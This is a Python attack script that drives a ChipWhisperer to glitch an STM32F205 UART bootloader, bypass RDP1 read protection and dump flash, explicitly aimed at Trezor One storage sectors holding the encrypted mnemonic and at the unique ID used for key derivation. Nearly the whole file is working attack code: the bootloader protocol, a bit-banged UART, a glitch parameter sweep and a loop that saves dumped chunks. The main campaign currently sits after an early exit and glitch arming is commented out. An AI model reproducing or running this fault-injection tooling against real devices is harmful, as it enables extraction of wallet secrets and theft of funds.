#!/usr/bin/env python3
"""
Flash Memory Dump via UART Bootloader Glitching
Uses ChipWhisperer IO1 (TX) and IO2 (RX) for UART communication
Targets STM32 bootloader Read Memory command with RDP1 bypass
"""

import chipwhisperer as cw
import chipwhisperer.common.results.glitch as glitch
import time
import os
from datetime import datetime
import signal
import sys

# Configuration
ENABLE_GLITCH = False  # Set to True to enable glitching, False to just test UART
ENABLE_RESET = True   # Set to False to disable resets
REPEAT_ON_FAILURE = True  # Set to True to restart campaign if no glitches found

# Target memory range - Choose which range to dump
TARGET_RANGE = "UNIQUE_ID"  # Options: "STORAGE", "OPTION_BYTES", "UNIQUE_ID", "TEST_UNPROTECTED"

if TARGET_RANGE == "STORAGE":
    # Trezor One storage sectors where encrypted mnemonic is stored
    FLASH_START = 0x08008000  # Start of storage sector 2
    FLASH_END = 0x0800FFFF    # End of storage sector 3 (32KB total)
elif TARGET_RANGE == "OPTION_BYTES":
    # STM32 Option Bytes (contains RDP level, write protection, etc.)
    FLASH_START = 0x1FFFC000  # Start of option bytes
    FLASH_END = 0x1FFFC00F    # End of option bytes (16 bytes)
elif TARGET_RANGE == "UNIQUE_ID":
    # STM32F205 96-bit Unique Device ID (used for SEK derivation)
    FLASH_START = 0x1FFF7A10  # Base address of unique ID
    FLASH_END = 0x1FFF7A1B    # 12 bytes (96 bits)
    CHUNK_SIZE = 12           # Read all 12 bytes at once for unique ID
elif TARGET_RANGE == "TEST_UNPROTECTED":
    # Unprotected peripheral registers for testing
    FLASH_START = 0xE0042000  # DBGMCU_IDCODE
    FLASH_END = 0xE004200B    # 12 bytes
    CHUNK_SIZE = 4            # Read 4 bytes at a time
else:
    print(f"Unknown TARGET_RANGE: {TARGET_RANGE}")
    sys.exit(1)

# Set default chunk size if not already set
if 'CHUNK_SIZE' not in locals():
    CHUNK_SIZE = 32  # Default: Read 32 bytes at a time


class STM32Bootloader:
    """STM32 UART Bootloader Protocol Implementation"""

    # Bootloader commands
    SYNC = 0x7F          # Bootloader activation
    GET = 0x00           # Get version and supported commands
    GET_VER = 0x01       # Get version and read protection status
    GET_ID = 0x02        # Get chip ID
    READ_MEM = 0x11      # Read memory (blocked by RDP1)
    GO = 0x21            # Jump to application
    WRITE_MEM = 0x31     # Write memory (blocked by RDP1)
    ERASE = 0x43         # Erase memory
    ACK = 0x79           # Positive acknowledgment
    NACK = 0x1F          # Negative acknowledgment

    def __init__(self, target):
        self.target = target
        self.timeout = 0.1  # 100ms timeout

    def send_byte(self, byte):
        """Send single byte via UART"""
        print(f"TX: 0x{byte:02X}", end=" ")
        if hasattr(self.target, 'send_byte'):
            # Software UART
            self.target.send_byte(byte)
        else:
            # Hardware UART
            self.target.write(bytes([byte]))
            self.target.flush()

    def read_byte(self):
        """Read single byte via UART"""
        if hasattr(self.target, 'receive_byte'):
            # Software UART
            data = self.target.receive_byte(self.timeout)
            if data is not None:
                print(f"RX: 0x{data:02X}", end=" ")
                return data
        else:
            # Hardware UART
            data = self.target.read(1, timeout=self.timeout)
            if data:
                print(f"RX: 0x{data[0]:02X}", end=" ")
                return data[0]
        print("RX: TIMEOUT", end=" ")
        return None

    def wait_ack(self):
        """Wait for ACK/NACK response"""
        response = self.read_byte()
        if response == self.ACK:
            return True
        elif response == self.NACK:
            return False
        return None  # Timeout or other response

    def send_address(self, address):
        """Send 32-bit address with checksum"""
        addr_bytes = [
            (address >> 24) & 0xFF,
            (address >> 16) & 0xFF,
            (address >> 8) & 0xFF,
            address & 0xFF
        ]
        checksum = 0
        for b in addr_bytes:
            self.send_byte(b)
            checksum ^= b
        self.send_byte(checksum)

    def sync(self):
        """Synchronize with bootloader"""
        # Send sync byte
        self.send_byte(self.SYNC)
        # Wait for ACK
        return self.wait_ack()

    def get_id(self):
        """Get chip ID (should work even with RDP1)"""
        self.send_byte(self.GET_ID)
        self.send_byte(~self.GET_ID & 0xFF)

        if self.wait_ack():
            # Read number of bytes
            n = self.read_byte()
            if n:
                # Read PID
                pid = []
                for _ in range(n + 1):
                    pid.append(self.read_byte())
                if self.wait_ack():
                    return bytes(pid)
        return None

    def read_memory(self, address, length):
        """Read memory - needs glitch to bypass RDP1"""
        # Send Read Memory command
        self.send_byte(self.READ_MEM)
        self.send_byte(~self.READ_MEM & 0xFF)

        # Wait for first ACK (command accepted)
        if not self.wait_ack():
            return None

        # Send address - This is where RDP check happens
        self.send_address(address)

        # Wait for address ACK - This will fail with RDP1 unless glitched
        if not self.wait_ack():
            return None

        # Send number of bytes to read
        self.send_byte(length - 1)
        self.send_byte(~(length - 1) & 0xFF)

        # Wait for final ACK
        if not self.wait_ack():
            return None

        # Read data
        data = self.target.read(length, timeout=0.5)
        return data if len(data) == length else None


def check_memory_read_uart(address, scope, target):
    """Try to read memory via UART - success means RDP was bypassed"""
    try:
        bootloader = STM32Bootloader(target)

        # Sync with bootloader
        if not bootloader.sync():
            print("!", end="", flush=True)  # Sync failed
            return None

        # Glitch disabled for testing
        # if ENABLE_GLITCH:
        #     scope.arm()

        # Attempt to read memory (RDP check happens here)
        data = bootloader.read_memory(address, CHUNK_SIZE)

        if data:
            # Check if it's not the fault pattern
            if data != b'\x11\x00\x74\x24' * (CHUNK_SIZE // 4):
                print(f"\n💥 SUCCESS! Read {len(data)} bytes from 0x{address:08X}")
                print(f"First 16 bytes: ", end="")
                for i in range(min(16, len(data))):
                    print(f"{data[i]:02X} ", end="")
                print()
                return data
            else:
                print("F", end="", flush=True)  # Fault pattern
                return None
        else:
            print(".", end="", flush=True)  # Normal NACK
            return None

    except Exception as e:
        print("E", end="", flush=True)  # Exception
        return None


def save_memory_chunk(address, data):
    """Save memory chunk to file"""
    if not os.path.exists('FLASH'):
        os.makedirs('FLASH')

    filename = f"FLASH/uart_0x{address:08X}.bin"
    with open(filename, 'wb') as f:
        f.write(data)
    print(f"Saved to {filename}")


def cleanup_and_exit(signum=None, frame=None):
    """Gracefully cleanup before exit"""
    print("\n\n⚠️ Cleaning up...")

    try:
        # Disable glitching
        scope.glitch.output = "disabled"
        print("✓ Glitching disabled")

        # Release reset if held
        scope.io.nrst = 'high_z'
        print("✓ nRST released")

        # Disconnect
        scope.dis()
        target.dis()
        print("✓ Disconnected")

    except Exception as e:
        print(f"⚠️ Cleanup error: {e}")

    print("✅ Clean exit")
    sys.exit(0)


# Register signal handlers
signal.signal(signal.SIGINT, cleanup_and_exit)
signal.signal(signal.SIGTERM, cleanup_and_exit)

# Connect to ChipWhisperer
print("="*60)
print("UART Bootloader Flash Dump via Glitching")
print("="*60)

try:
    scope = cw.scope()
    # Don't use the standard target, we need direct serial access
    # target = cw.target(scope)
except Exception as e:
    print(f"❌ Failed to connect to ChipWhisperer: {e}")
    sys.exit(1)

# Configure UART on IO pins - Using GPIO bit-banging
print("\n[*] Configuring software UART on TIO1/TIO2...")

# Set TIO pins as GPIO
scope.io.tio1 = 'high_z'  # Will be TX (output)
scope.io.tio2 = 'high_z'  # Will be RX (input)

# Configure TIO1 as output (TX), TIO2 as input (RX)
scope.io.tio1 = True  # Start with idle high (UART idle state)

import time

class SoftwareUART:
    """Software UART implementation using ChipWhisperer IO pins"""

    def __init__(self, scope, tx_pin='tio1', rx_pin='tio2', baud=115200):
        self.scope = scope
        self.tx_pin = tx_pin
        self.rx_pin = rx_pin
        self.baud = baud
        self.bit_time = 1.0 / baud

        # Set TX high (idle state)
        if tx_pin == 'tio1':
            self.scope.io.tio1 = True
        elif tx_pin == 'tio3':
            self.scope.io.tio3 = True

    def write_bit(self, bit):
        """Write a single bit with precise timing"""
        start_time = time.perf_counter()

        if self.tx_pin == 'tio1':
            self.scope.io.tio1 = bool(bit)
        elif self.tx_pin == 'tio3':
            self.scope.io.tio3 = bool(bit)

        # Wait for precise bit time
        while (time.perf_counter() - start_time) < self.bit_time:
            pass

    def read_bit(self):
        """Read a single bit"""
        if self.rx_pin == 'tio2':
            return self.scope.io.tio2
        elif self.rx_pin == 'tio4':
            return self.scope.io.tio4
        return 0

    def send_byte(self, byte):
        """Send a byte with start bit, data, even parity, stop bit"""
        # Calculate even parity
        parity = 0
        for i in range(8):
            if byte & (1 << i):
                parity ^= 1

        # Start bit (0)
        self.write_bit(0)

        # Data bits (LSB first)
        for i in range(8):
            self.write_bit((byte >> i) & 1)

        # Parity bit (even)
        self.write_bit(parity)

        # Stop bit (1)
        self.write_bit(1)

    def receive_byte(self, timeout=0.1):
        """Receive a byte with timeout"""
        start_time = time.time()

        # Wait for start bit
        while self.read_bit() == 1:
            if time.time() - start_time > timeout:
                return None

        # Wait half bit time to sample in middle
        time.sleep(self.bit_time / 2)

        # Read start bit (should be 0)
        if self.read_bit() != 0:
            return None

        time.sleep(self.bit_time)

        # Read data bits
        byte = 0
        parity_calc = 0
        for i in range(8):
            bit = self.read_bit()
            byte |= (bit << i)
            parity_calc ^= bit
            time.sleep(self.bit_time)

        # Read parity bit
        parity = self.read_bit()
        time.sleep(self.bit_time)

        # Read stop bit
        stop = self.read_bit()

        # Check parity and stop bit
        if parity != parity_calc or stop != 1:
            return None

        return byte

    def write(self, data):
        """Write multiple bytes"""
        for byte in data:
            self.send_byte(byte)
        return len(data)

    def read(self, size, timeout=0.1):
        """Read multiple bytes"""
        data = []
        for _ in range(size):
            byte = self.receive_byte(timeout)
            if byte is None:
                break
            data.append(byte)
        return bytes(data) if data else b''

    def flush(self):
        """Flush - no-op for software UART"""
        pass

# Create software UART instance to match your wiring
# Your wiring: IO1->STM32_RX(PA3), IO2->STM32_TX(PA2)
# So: ChipWhisperer TX->IO1->STM32_RX, ChipWhisperer RX->IO2->STM32_TX
target = SoftwareUART(scope, tx_pin='tio1', rx_pin='tio2', baud=9600)

print("[+] Software UART configured:")
print(f"    Baud: {target.baud}")
print(f"    TIO1 -> Target PA3 (USART2_RX)")
print(f"    TIO2 <- Target PA2 (USART2_TX)")
print(f"    Using even parity for STM32 bootloader")

# Alternative: Try using high_z and manually controlling
# scope.io.tio1 = 'high_z'
# scope.io.tio2 = 'high_z'

print(f"[+] UART configured: 115200 baud")
print(f"    IO1 (TX) -> Target PA3 (USART2_RX)")
print(f"    IO2 (RX) <- Target PA2 (USART2_TX)")
print(f"[!] Note: STM32 bootloader uses EVEN parity")
print(f"[!] USART2 on PA2/PA3 is the bootloader UART")

# Set up glitch parameters
print("\n[*] Configuring glitch parameters...")
scope.clock.clkgen_freq = 100E6
scope.trigger.triggers = 'tio2'  # Trigger on UART RX activity
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"
scope.glitch.trigger_src = "ext_single"
scope.io.glitch_lp = True
scope.io.glitch_hp = True
scope.glitch.repeat = 20  # Higher repeat for UART protocol

# Glitch parameters - starting fresh for UART
width_min, width_max = 40, 40  # Fixed width
offset_min, offset_max = -45, -45  # Keep proven offset

# Start from 0 for UART timing discovery
ext_offset_min, ext_offset_max = 0, 2000000  # 0 to 20ms full search

# Create glitch controller
gc = glitch.GlitchController(groups=["success", "failure"], parameters=["width", "offset", "ext_offset"])
gc.set_global_step(100)  # 1µs steps for initial search

gc.set_range("width", width_min, width_max)
gc.set_range("offset", offset_min, offset_max)
gc.set_range("ext_offset", ext_offset_min, ext_offset_max)

print(f"\nGlitch Configuration:")
print(f"  Width: {width_min} to {width_max}")
print(f"  Offset: {offset_min}")
print(f"  Ext_offset: {ext_offset_min/100:.1f}µs to {ext_offset_max/100:.1f}µs")
print(f"  Repeat: {scope.glitch.repeat}")
print(f"  Trigger: TIO2 (UART RX)")

sample_size = 10  # Attempts per glitch setting

print(f"\nTarget: {TARGET_RANGE}")
print(f"Address range: 0x{FLASH_START:08X} - 0x{FLASH_END:08X}")
print(f"Chunk size: {CHUNK_SIZE} bytes")
print(f"Sample size: {sample_size} attempts per setting")
print("="*60)

# Test bootloader connection first
print("\n[*] Testing bootloader connection...")

# Debug: Check serial configuration
print("[*] Testing serial configuration...")
try:
    # Try to access serial info if available
    if hasattr(target, 'target'):
        print(f"[*] Using ChipWhisperer SimpleSerial interface")
        print(f"[*] Baud rate: {target.target.baud}")
    else:
        print(f"[*] Using direct serial wrapper")
except Exception as e:
    print(f"[!] Could not get serial info: {e}")

bootloader = STM32Bootloader(target)

print("\n[*] Simple UART Test - Just sending sync byte...")

# Send sync byte and show raw response
print("\nSending: 0x7F")
target.send_byte(0x7F)

print("Waiting for response...")
response = target.receive_byte(timeout=1.0)

if response is not None:
    print(f"Received: 0x{response:02X}")
    if response == 0x79:
        print("✅ SUCCESS: Got ACK (0x79) - Bootloader is responding!")
    elif response == 0x1F:
        print("❌ Got NACK (0x1F) - Bootloader rejected sync")
    else:
        print(f"⚠️ Got unexpected response: 0x{response:02X}")
else:
    print("❌ TIMEOUT: No response from target")

print("\n" + "="*60)
print("Simple UART Test Complete!")
print("Expected result: 0x79 (ACK) if bootloader is active")
print("="*60)

input("\nPress Enter to exit...")
sys.exit(0)

# Main glitch campaign (disabled)
print("\n[*] Starting glitch campaign...")
current_address = FLASH_START
total_attempts = 0
campaign_number = 1

while True:
    print(f"\n🎯 Campaign #{campaign_number} - Target: 0x{current_address:08X}")

    found = False

    for glitch_setting in gc.glitch_values():
        scope.glitch.width = glitch_setting[0]
        scope.glitch.offset = glitch_setting[1]
        scope.glitch.ext_offset = glitch_setting[2]

        print(f"Testing ext_offset: {scope.glitch.ext_offset/100:.1f}µs ", end="")

        for i in range(sample_size):
            total_attempts += 1

            # Reset target to bootloader mode
            if ENABLE_RESET:
                scope.io.nrst = False
                time.sleep(0.1)
                scope.io.nrst = 'high_z'
                time.sleep(0.5)

            # Attempt memory read with glitch
            data = check_memory_read_uart(current_address, scope, target)

            if data:
                print(f"\n✅ GLITCH SUCCESS at ext_offset={scope.glitch.ext_offset/100:.1f}µs")
                print(f"   Width={scope.glitch.width}, Repeat={scope.glitch.repeat}")
                save_memory_chunk(current_address, data)
                current_address += CHUNK_SIZE
                found = True
                break

        if found:
            break

        print("")  # New line after attempts

    if not found:
        print(f"❌ Campaign #{campaign_number} failed - no glitches found")
        if REPEAT_ON_FAILURE:
            campaign_number += 1
            print(f"🔄 Starting campaign #{campaign_number}...")
            time.sleep(2)
        else:
            break
    else:
        if current_address > FLASH_END:
            print(f"\n🎉 SUCCESS! Dumped entire range!")
            break

print(f"\n{'='*60}")
print(f"Campaign complete!")
print(f"Total attempts: {total_attempts}")
print(f"Total campaigns: {campaign_number}")
print(f"{'='*60}")

cleanup_and_exit()